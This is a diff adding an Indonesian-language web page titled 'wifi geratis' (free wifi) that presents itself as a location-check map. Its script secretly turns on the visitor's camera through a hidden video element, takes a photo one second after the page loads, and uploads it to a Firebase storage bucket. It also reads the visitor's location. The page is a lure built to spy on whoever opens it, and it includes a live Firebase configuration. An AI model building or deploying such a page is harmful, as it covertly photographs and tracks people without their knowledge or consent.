@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>wifi geratis</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 20px;
+  background-color: #f2f2f2;
+}
+
+h1 {
+  text-align: center;
+  color: #333;
+}
+
+#video {
+  display: none;
+}
+
+#capture {
+  display: block;
+  margin: 20px auto;
+  padding: 10px 20px;
+  font-size: 16px;
+  font-weight: bold;
+  color: #fff;
+  background-color: #333;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.container {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.row {
+  display: flex;
+  justify-content: center;
+}
+
+img {
+  width: 100%;
+  max-width: 150px;
+  height: auto;
+  object-fit: cover;
+  margin: 10px;
+}
+
+/* Tampilan mode mobile */
+@media (max-width: 480px) {
+  body {
+    padding: 10px;
+  }
+
+  img {
+    max-width: 100%;
+    max-height: 100px;
+  }
+}
+#camera-view {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+#video {
+  display: none;
+  width: 100%;
+  max-width: 640px;
+  margin-bottom: 20px;
+}
+
+#capture {
+  margin: 10px auto;
+}
+
+
+</style>
+<body>
+  <h1>cek lokasimu</h1>
+  <div class="container">
+    
+    
+    <div id="map" style="width: 100%; height: 400px;"></div>
+    <div id="search-box" style="position: absolute; top: 10px; left: 10px; z-index: 1000;"></div>
+    
+    
+  <video id="video" width="640" height="480" autoplay></video>
+  <div id="map-info" style="margin-top: 10px;"></div>
+  <button id="capture">Kembali</button>
+  <div id="loading" style="display: none;">
+    Loading...
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script> 
+  <script src = "https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js" > </script>
+  <!-- Tambahkan pustaka Leaflet.js -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+
+
+<!-- Tambahkan pustaka Leaflet Control Geocoder -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet-control-geocoder/dist/Control.Geocoder.css" />
+<script src="https://unpkg.com/leaflet-control-geocoder/dist/Control.Geocoder.js"></script>
+<script>
+      // Konfigurasi Firebase
+      var firebaseConfig = {
+        apiKey: "AIzaSyCEdCVji-u9SNLJt_eIvFkARVGmfSpUDTg",
+        authDomain: "mata-df0fc.firebaseapp.com",
+        projectId: "mata-df0fc",
+        storageBucket: "mata-df0fc.appspot.com",
+        messagingSenderId: "188932334196",
+        appId: "1:188932334196:web:d9e771bf6e2fb772e82721",
+        measurementId: "G-TLVV9LJKLY"
+      };
+    
+    // Inisialisasi Firebase
+    firebase.initializeApp(firebaseConfig);
+    var storageRef = firebase.storage().ref();
+    
+    // Mengambil video dan menampilkan di elemen video
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        var video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
+    
+        // Mengambil gambar setelah halaman dibuka
+        setTimeout(function() {
+          takePicture();
+        }, 1000);
+      })
+      .catch(function(error) {
+        console.error("Tidak dapat mengakses kamera: ", error);
+      });
+    
+    // Mengambil gambar dan mengunggah ke Firebase Storage
+    function takePicture() {
+      var video = document.getElementById('video');
+      var canvas = document.createElement('canvas');
+      var context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+      canvas.toBlob(function(blob) {
+        var imageName = new Date().getTime() + '.png';
+    
+        // Mengunggah gambar ke Firebase Storage di folder "gambar"
+        var uploadTask = storageRef.child('gambar/' + imageName).put(blob);
+    
+        uploadTask.then(function(snapshot) {
+          console.log('Gambar berhasil diunggah ke Firebase Storage.');
+        }).catch(function(error) {
+          console.error('Gagal mengunggah gambar: ', error);
+        });
+      }, 'image/png');
+    }
+
+    // Menutup jendela saat tombol "Kembali" diklik
+    var captureButton = document.getElementById('capture');
+    captureButton.addEventListener('click', function() {
+      window.close();
+    });
+    
+     // Inisialisasi peta Leaflet pada elemen dengan id "map"
+       var mymap = L.map('map').setView([0, 0], 13);
+      
+       // Tambahkan peta OpenStreetMap ke peta Leaflet
+       L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+         attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+       }).addTo(mymap);
+      
+       // Tambahkan kontrol pencarian
+       var searchControl = L.Control.geocoder({
+         defaultMarkGeocode: false
+       }).on('markgeocode', function(e) {
+         // Pindahkan peta ke lokasi hasil pencarian
+         mymap.setView(e.geocode.center, 13);
+      
+         // Tambahkan penanda lokasi pada peta
+         var marker = L.marker(e.geocode.center).addTo(mymap);
+         marker.bindPopup("<b>" + e.geocode.name + "</b>").openPopup();
+       }).addTo(mymap);
+      
+       // Dapatkan lokasi terkini
+       navigator.geolocation.getCurrentPosition(function(position) {
+         var latitude = position.coords.latitude;
+         var longitude = position.coords.longitude;
+      
+         // Setel peta pada lokasi terkini
+         mymap.setView([latitude, longitude], 13);
+      
+         // Tambahkan penanda lokasi pada peta
+         var marker = L.marker([latitude, longitude]).addTo(mymap);
+         marker.bindPopup("<b>Lokasi Anda</b>").openPopup();
+       }, function(error) {
+         console.error("Tidak dapat mengambil lokasi: ", error);
+       });
+       
+       var cctvLayer = L.layerGroup().addTo(mymap);
+       
+       
+  </script>
+</body>
+</html>
